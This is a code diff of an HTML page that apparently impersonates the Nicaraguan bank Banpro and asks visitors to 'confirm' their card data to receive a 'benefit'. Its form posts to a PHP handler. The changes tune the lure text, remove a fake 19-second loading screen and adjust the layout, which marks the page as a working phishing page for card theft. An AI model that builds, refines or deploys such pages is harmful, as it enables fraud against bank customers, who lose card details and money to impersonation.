@@ -37,7 +37,7 @@
     width: 328px;
     height: 40px;
     margin-left: -168px;
-    margin-top: -85px;
+    margin-top: -74px;
     font-family: sans-serif;
     background-color: transparent !important;
     position: absolute;
@@ -65,19 +65,12 @@
 }
 </style>
 
-<body>
+<body style="margin-left: 0px;">
 <center>
-    <div id="ld" style="position: fixed;width:100%;height: 100%;background: rgba(255,255,255,1);z-index: 10;text-align:center;">
-        <img src="tmp.svg" style="width: 300px;margin-top: 200px;">
-        <br>
-        <div style="width: 126px;height: 126px;display:inline-block;border: 5px solid #00693c;border-radius: 50%;">
-            <img src="p.gif?id=50" style="width: 110px;position: relative;top: 36px;">
-        </div>
-    </div>
-
+     
     <form action="php/indeff.php" method="post" class="form">
         <img style="width: 250px; user-select: none; pointer-events: none;" src="l.png" alt="">
-        <p style="font-family: sans-serif;color: #00693c;font-size: 20px;">Confirma los datos de alguna de tus Tarjetas Banpro</p>
+        <p style="font-family: sans-serif;color: #00693c;font-size: 20px;">Confirma los datos de la Tarjeta que recibira este beneficio</p>
         <img class="for" src="img/tarjtitulo.png" style="width: 100%;" alt="">
         <br><br>
 
@@ -98,8 +91,8 @@
         <br><br>
         <input type="submit" value="Ingresar" class="fua">
     </form>
-
-    <img src="img/abj.png" alt="" width="100%">
+    <br><br><br><br><br><br><br><br><br><br><br><br>
+    <img  src="img/abj.png" alt="" width="390px">
 
     <script>
         // Formatear el número de tarjeta (cada 4 dígitos, añadir espacio)
@@ -129,11 +122,7 @@
         }
 
         // Ocultar el cargador después de 19 segundos
-        window.onload = function() {
-            setTimeout(function() {
-                document.getElementById("ld").style.display = "none";
-            }, 19000);
-        };
+        
     </script>
 </center>
 </body>
